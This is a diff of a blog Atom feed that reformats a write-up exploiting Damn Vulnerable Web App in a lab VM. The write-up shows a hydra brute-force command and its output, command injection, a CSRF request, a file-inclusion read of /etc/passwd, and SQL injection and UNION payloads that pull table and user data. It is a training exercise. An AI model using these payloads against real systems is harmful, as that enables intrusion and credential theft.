@@ -4,7 +4,7 @@
   <title><![CDATA[Category: web | /home/mislusnys]]></title>
   <link href="http://mislusnys.github.io/blog/categories/web/atom.xml" rel="self"/>
   <link href="http://mislusnys.github.io/"/>
-  <updated>2015-02-04T17:16:24-05:00</updated>
+  <updated>2015-02-04T17:26:38-05:00</updated>
   <id>http://mislusnys.github.io/</id>
   <author>
     <name><![CDATA[Mindaugas Slusnys]]></name>
@@ -237,14 +237,14 @@ Web applications frequently redirect and forward users to other pages and websit
     <id>http://mislusnys.github.io/blog/2015/02/02/damn-vulnerable-web-application</id>
     <content type="html"><![CDATA[<h2>Intro</h2>
 
-<blockquote><p>Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.</p></blockquote>
+<p>Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.</p>
 
 <!--more-->
 
 
 <p>In this report we will be exploiting the vulnerabilities that are present in the DVWA (version 1.0.7).
-We will use the version that is bundled in the <a href="http://sourceforge.net/projects/metasploitable/files/Metasploitable2/">Metasploitable 2</a> VM (IP address 192.168.52.129).
-We will use the lowest security setting (<strong>PHPIDS</strong>:disabled and <strong>Security Level</strong>:low).</p>
+We will use the version that is bundled in the <a href="http://sourceforge.net/projects/metasploitable/files/Metasploitable2/">Metasploitable 2</a> VM.
+We will use the lowest security setting (<em>PHPIDS:disabled</em> and <em>Security Level:low</em>).</p>
 
 <h2>Brute Force</h2>
 
@@ -252,411 +252,250 @@ We will use the lowest security setting (<strong>PHPIDS</strong>:disabled and <s
 
 <p><img src="/images/bf.png"></p>
 
-<p>Using <code>burp</code> we find that parameters are transmitted via URL:
-<code>
-http://192.168.52.129/dvwa/vulnerabilities/brute/?username=test&amp;password=test&amp;Login=Login#
-</code>
-And our session data:
-<code>
-Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28
-</code>
-Using this information we can use <code>hydra</code> to brute force the login form:
+<p>Using <code>burp</code> we find that parameters are transmitted via URL:</p>
+
+<pre><code>http://192.168.52.129/dvwa/vulnerabilities/brute/?username=test&amp;password=test&amp;Login=Login#
+</code></pre>
+
+<p>And our session data:</p>
+
+<pre><code>Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28
+</code></pre>
+
+<p>Using this information we can use <code>hydra</code> to brute force the login form:</p>
+
+<pre><code>root@kali:~# hydra 192.168.52.129 -L user.txt -P pass.txt http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28"
+Hydra v7.6 (c)2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-02-02 09:13:54
+[DATA] 16 tasks, 1 server, 28 login tries (l:4/p:7), ~1 try per task
+[DATA] attacking service http-get-form on port 80
+[80][www-form] host: 192.168.52.129   login: admin   password: password
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2015-02-02 09:13:57
+</code></pre>
+
+<p>We found valid login credentials: <code>admin:password</code></p>
+
+<h2>Command Execution</h2>
+
+<p><img src="/images/ce.png"></p>
+
+<p>This part of the app gives the current user the ability to ping a host.
+However it uses a vulnerable piece of code:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">ping</span>  <span class="o">-</span><span class="nx">c</span> <span class="mi">3</span> <span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span> <span class="o">.</span> <span class="nv">$target</span> <span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Since we control the <code>$target</code> variable, we can use <code>;</code> or <code>||</code> to stack commands.</p>
+
+<p>Using <code>127.0.0.1;ls -al</code> as input we get:</p>
+
+<pre><code>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.000 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.043 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.089 ms
+
+--- 127.0.0.1 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1998ms
+rtt min/avg/max/mdev = 0.000/0.044/0.089/0.036 ms
+total 20
+drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
+drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
+drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
+-rw-r--r--  1 www-data www-data 1509 Mar 16  2010 index.php
+drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source
+</code></pre>
+
+<h2>CSRF</h2>
+
+<p><img src="/images/csrf.png"></p>
+
+<p>CSRF is an attack in which an authenticated user (usually administrator) unknowingly executes a certain action.
+In our case the password change operation results in the following request:</p>
+
+<pre><code>http://192.168.52.129/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#
+</code></pre>
+
+<p>If we can trick an authenticated user to make this request, we can change this user&rsquo;s password. Usually this is done by tricking the user into visiting a page controlled by the attacker with malicious request embedded inside <code>img</code>, <code>iframe</code> tags or inside malicious javascript code.</p>
+
+<h2>File Inclusion</h2>
+
+<p><img src="/images/fi.png"></p>
+
+<p>This one is pretty straight forward. We can change the <code>page</code> variable to display sensitive information:</p>
+
+<pre><code>http://192.168.52.129/dvwa/vulnerabilities/fi/?page=/etc/passwd
+</code></pre>
+
+<pre><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
+bin:x:2:2:bin:/bin:/bin/sh 
+sys:x:3:3:sys:/dev:/bin/sh 
+sync:x:4:65534:sync:/bin:/bin/sync 
+games:x:5:60:games:/usr/games:/bin/sh 
+man:x:6:12:man:/var/cache/man:/bin/sh 
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh 
+mail:x:8:8:mail:/var/mail:/bin/sh 
+news:x:9:9:news:/var/spool/news:/bin/sh 
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh 
+proxy:x:13:13:proxy:/bin:/bin/sh 
+www-data:x:33:33:www-data:/var/www:/bin/sh 
+backup:x:34:34:backup:/var/backups:/bin/sh 
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh 
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh 
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh 
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh 
+dhcp:x:101:102::/nonexistent:/bin/false 
+syslog:x:102:103::/home/syslog:/bin/false 
+klog:x:103:104::/home/klog:/bin/false 
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin 
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash 
+bind:x:105:113::/var/cache/bind:/bin/false 
+postfix:x:106:115::/var/spool/postfix:/bin/false 
+ftp:x:107:65534::/home/ftp:/bin/false 
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash 
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false 
+tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false 
+distccd:x:111:65534::/:/bin/false 
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash 
+service:x:1002:1002:,,,:/home/service:/bin/bash 
+telnetd:x:112:120::/nonexistent:/bin/false 
+proftpd:x:113:65534::/var/run/proftpd:/bin/false 
+statd:x:114:65534::/var/lib/nfs:/bin/false 
+snmp:x:115:65534::/var/lib/snmp:/bin/false 
+</code></pre>
+
+<h2>SQL Injection</h2>
+
+<p><img src="/images/sqli.png"></p>
+
+<p>User input is unfiltered and used in the following query:
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-<span class='line-number'>82</span>
-<span class='line-number'>83</span>
-<span class='line-number'>84</span>
-<span class='line-number'>85</span>
-<span class='line-number'>86</span>
-<span class='line-number'>87</span>
-<span class='line-number'>88</span>
-<span class='line-number'>89</span>
-<span class='line-number'>90</span>
-<span class='line-number'>91</span>
-<span class='line-number'>92</span>
-<span class='line-number'>93</span>
-<span class='line-number'>94</span>
-<span class='line-number'>95</span>
-<span class='line-number'>96</span>
-<span class='line-number'>97</span>
-<span class='line-number'>98</span>
-<span class='line-number'>99</span>
-<span class='line-number'>100</span>
-<span class='line-number'>101</span>
-<span class='line-number'>102</span>
-<span class='line-number'>103</span>
-<span class='line-number'>104</span>
-<span class='line-number'>105</span>
-<span class='line-number'>106</span>
-<span class='line-number'>107</span>
-<span class='line-number'>108</span>
-<span class='line-number'>109</span>
-<span class='line-number'>110</span>
-<span class='line-number'>111</span>
-<span class='line-number'>112</span>
-<span class='line-number'>113</span>
-<span class='line-number'>114</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# hydra 192.168.52.129 -L user.txt -P pass.txt http-get-form &ldquo;/dvwa/vulnerabilities/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28&rdquo;
-</span><span class='line'>Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;Hydra (&lt;a href="http://www.thc.org/thc-hydra"&gt;http://www.thc.org/thc-hydra&lt;/a&gt;) starting at 2015-02-02 09:13:54
-</span><span class='line'>[DATA] 16 tasks, 1 server, 28 login tries (l:4/p:7), ~1 try per task
-</span><span class='line'>[DATA] attacking service http-get-form on port 80
-</span><span class='line'>[80][www-form] host: 192.168.52.129   login: admin   password: password
-</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
-</span><span class='line'>Hydra (&lt;a href="http://www.thc.org/thc-hydra"&gt;http://www.thc.org/thc-hydra&lt;/a&gt;) finished at 2015-02-02 09:13:57
-</span><span class='line'>&lt;code&gt;``
-</span><span class='line'>We found valid login credentials:&lt;/code&gt;admin:password`&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;h2&gt;Command Execution&lt;/h2&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;<img src="/images/ce.png">&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;This part of the app gives the current user the ability to ping a host.
-</span><span class='line'>However it uses a vulnerable piece of code:
-</span><span class='line'><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;/</span><span class="nx">span</span><span class="o">&gt;&lt;</span><span class="nx">span</span> <span class="nx">class</span><span class="o">=</span><span class="s1">&#39;line&#39;</span><span class="o">&gt;</span><span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">ping</span>  <span class="o">-</span><span class="nx">c</span> <span class="mi">3</span> <span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span> <span class="o">.</span> <span class="nv">$target</span> <span class="p">);</span>
-</span><span class='line'><span class="o">&lt;/</span><span class="nx">span</span><span class="o">&gt;&lt;</span><span class="nx">span</span> <span class="nx">class</span><span class="o">=</span><span class="s1">&#39;line&#39;</span><span class="o">&gt;</span>
-</span></code></pre></td></tr></table></div></figure>&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;Since we control the &lt;code&gt;$target&lt;/code&gt; variable, we can use &lt;code&gt;;&lt;/code&gt; or &lt;code&gt;||&lt;/code&gt; to stack commands.&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;Using &lt;code&gt;127.0.0.1;ls -al&lt;/code&gt; as input we get:&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;pre&gt;&lt;code&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
-</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.000 ms
-</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.043 ms
-</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.089 ms
-</span><span class='line'>
-</span><span class='line'>&#8212; 127.0.0.1 ping statistics &#8212;
-</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 1998ms
-</span><span class='line'>rtt min/avg/max/mdev = 0.000/0.044/0.089/0.036 ms
-</span><span class='line'>total 20
-</span><span class='line'>drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
-</span><span class='line'>drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
-</span><span class='line'>drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
-</span><span class='line'>-rw-r&#8211;r&#8211;  1 www-data www-data 1509 Mar 16  2010 index.php
-</span><span class='line'>drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source
-</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;h2&gt;CSRF&lt;/h2&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;<img src="/images/csrf.png">&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;CSRF is an attack in which an authenticated user (usually administrator) unknowingly executes a certain action.
-</span><span class='line'>In our case the password change operation results in the following request:
-</span><span class='line'>&lt;code&gt;
-</span><span class='line'>http://192.168.52.129/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#
-</span><span class='line'>&lt;/code&gt;
-</span><span class='line'>If we can trick an authenticated user to make this request, we can change this user&rsquo;s password. Usually this is done by tricking the user into visiting a page controlled by the attacker with malicious request embedded inside &lt;code&gt;img&lt;/code&gt;, &lt;code&gt;iframe&lt;/code&gt; tags or inside malicious javascript code.&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;h2&gt;File Inclusion&lt;/h2&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;<img src="/images/fi.png">&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;This one is pretty straight forward. We can change the &lt;code&gt;page&lt;/code&gt; variable to display sensitive information:&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;pre&gt;&lt;code&gt;http://192.168.52.129/dvwa/vulnerabilities/fi/?page=/etc/passwd
-</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;pre&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash
-</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
-</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh 
-</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh 
-</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync 
-</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh 
-</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh 
-</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh 
-</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh 
-</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh 
-</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh 
-</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh 
-</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh 
-</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh 
-</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
-</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh 
-</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh 
-</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh 
-</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh 
-</span><span class='line'>dhcp:x:101:102::/nonexistent:/bin/false 
-</span><span class='line'>syslog:x:102:103::/home/syslog:/bin/false 
-</span><span class='line'>klog:x:103:104::/home/klog:/bin/false 
-</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin 
-</span><span class='line'>msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash 
-</span><span class='line'>bind:x:105:113::/var/cache/bind:/bin/false 
-</span><span class='line'>postfix:x:106:115::/var/spool/postfix:/bin/false 
-</span><span class='line'>ftp:x:107:65534::/home/ftp:/bin/false 
-</span><span class='line'>postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash 
-</span><span class='line'>mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false 
-</span><span class='line'>tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false 
-</span><span class='line'>distccd:x:111:65534::/:/bin/false 
-</span><span class='line'>user:x:1001:1001:just a user,111,,:/home/user:/bin/bash 
-</span><span class='line'>service:x:1002:1002:,,,:/home/service:/bin/bash 
-</span><span class='line'>telnetd:x:112:120::/nonexistent:/bin/false 
-</span><span class='line'>proftpd:x:113:65534::/var/run/proftpd:/bin/false 
-</span><span class='line'>statd:x:114:65534::/var/lib/nfs:/bin/false 
-</span><span class='line'>snmp:x:115:65534::/var/lib/snmp:/bin/false 
-</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;h2&gt;SQL Injection&lt;/h2&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;<img src="/images/sqli.png">&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;User input is unfiltered and used in the following query:
-</span><span class='line'><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="o">&lt;/</span><span class="n">span</span><span class="o">&gt;&lt;</span><span class="n">span</span> <span class="k">class</span><span class="o">=</span><span class="s1">&#39;line&#39;</span><span class="o">&gt;</span><span class="k">SELECT</span> <span class="n">first_name</span><span class="p">,</span> <span class="n">last_name</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">user_id</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="err">$</span><span class="n">id</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
-</span><span class='line'><span class="o">&lt;/</span><span class="n">span</span><span class="o">&gt;&lt;</span><span class="n">span</span> <span class="k">class</span><span class="o">=</span><span class="s1">&#39;line&#39;</span><span class="o">&gt;</span>
+</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="n">first_name</span><span class="p">,</span> <span class="n">last_name</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">user_id</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="err">$</span><span class="n">id</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
 </span></code></pre></td></tr></table></div></figure>
-</span><span class='line'>If we enter &lt;code&gt;&#8217; or 1=1&#8211; -&lt;/code&gt; as an id then the query becomes:
-</span><span class='line'><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="o">&lt;/</span><span class="n">span</span><span class="o">&gt;&lt;</span><span class="n">span</span> <span class="k">class</span><span class="o">=</span><span class="s1">&#39;line&#39;</span><span class="o">&gt;</span><span class="k">SELECT</span> <span class="n">first_name</span><span class="p">,</span> <span class="n">last_name</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">user_id</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
-</span><span class='line'><span class="o">&lt;/</span><span class="n">span</span><span class="o">&gt;&lt;</span><span class="n">span</span> <span class="k">class</span><span class="o">=</span><span class="s1">&#39;line&#39;</span><span class="o">&gt;</span>
+If we enter <code>' or 1=1-- -</code> as an id then the query becomes:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="n">first_name</span><span class="p">,</span> <span class="n">last_name</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">user_id</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
 </span></code></pre></td></tr></table></div></figure>
-</span><span class='line'>which makes WHERE clause always true and shows us all the records:</span></code></pre></td></tr></table></div></figure></notextile></div>
-ID: &lsquo;or 1=1&ndash; -
+which makes WHERE clause always true and shows us all the records:</p>
+
+<pre><code>ID: 'or 1=1-- -
 First name: admin
-Surname: admin</p>
+Surname: admin
 
-<p>ID: &lsquo;or 1=1&ndash; -
+ID: 'or 1=1-- -
 First name: Gordon
-Surname: Brown</p>
+Surname: Brown
 
-<p>ID: &lsquo;or 1=1&ndash; -
+ID: 'or 1=1-- -
 First name: Hack
-Surname: Me</p>
+Surname: Me
 
-<p>ID: &lsquo;or 1=1&ndash; -
+ID: 'or 1=1-- -
 First name: Pablo
-Surname: Picasso</p>
+Surname: Picasso
 
-<p>ID: &lsquo;or 1=1&ndash; -
+ID: 'or 1=1-- -
 First name: Bob
 Surname: Smith
-<code>``
-Using</code>UNION` keyword we can extract any information available to the app&rsquo;s user from the database.</p>
+</code></pre>
 
-<blockquote><p>&lsquo; union select database(),null &ndash; -
-<code>
-ID: ' union select database(),null -- -
+<p>Using <code>UNION</code> keyword we can extract any information available to the app&rsquo;s user from the database.</p>
+
+<blockquote><p>&lsquo; union select database(),null &ndash; -</p></blockquote>
+
+<pre><code>ID: ' union select database(),null -- -
 First name: dvwa
-Surname:
-</code>
-&rsquo; union select table_name,null from information_schema.tables where table_schema=&lsquo;dvwa&rsquo;&ndash; -
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>ID:  &lsquo; union select table_name,null from information_schema.tables where table_schema='dvwa&rsquo;&ndash; -
-</span><span class='line'>First name: guestbook
-</span><span class='line'>Surname:&lt;/p&gt;&lt;/blockquote&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;ID:  &lsquo; union select table_name,null from information_schema.tables where table_schema='dvwa&rsquo;&ndash; -
-</span><span class='line'>First name: users
-</span><span class='line'>Surname:</span></code></pre></td></tr></table></div></figure></p>
+Surname: 
+</code></pre>
 
-<blockquote><p>&lsquo; union select column_name,null from information_schema.columns where table_name=&#8217;users&rsquo;&ndash; -
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>ID: &lsquo; union select column_name,null from information_schema.columns where table_name='users&rsquo;&ndash; -
-</span><span class='line'>First name: user_id
-</span><span class='line'>Surname:&lt;/p&gt;&lt;/blockquote&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;ID: &lsquo; union select column_name,null from information_schema.columns where table_name='users&rsquo;&ndash; -
-</span><span class='line'>First name: first_name
-</span><span class='line'>Surname:&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;ID: &lsquo; union select column_name,null from information_schema.columns where table_name='users&rsquo;&ndash; -
-</span><span class='line'>First name: last_name
-</span><span class='line'>Surname:&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;ID: &lsquo; union select column_name,null from information_schema.columns where table_name='users&rsquo;&ndash; -
-</span><span class='line'>First name: user
-</span><span class='line'>Surname:&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;ID: &lsquo; union select column_name,null from information_schema.columns where table_name='users&rsquo;&ndash; -
-</span><span class='line'>First name: password
-</span><span class='line'>Surname:&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;ID: &lsquo; union select column_name,null from information_schema.columns where table_name='users&rsquo;&ndash; -
-</span><span class='line'>First name: avatar
-</span><span class='line'>Surname:</span></code></pre></td></tr></table></div></figure></p>
+<blockquote><p>&lsquo; union select table_name,null from information_schema.tables where table_schema=&#8217;dvwa&rsquo;&ndash; -</p></blockquote>
 
-<blockquote><p>&lsquo; union select user, password from users&ndash; -
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
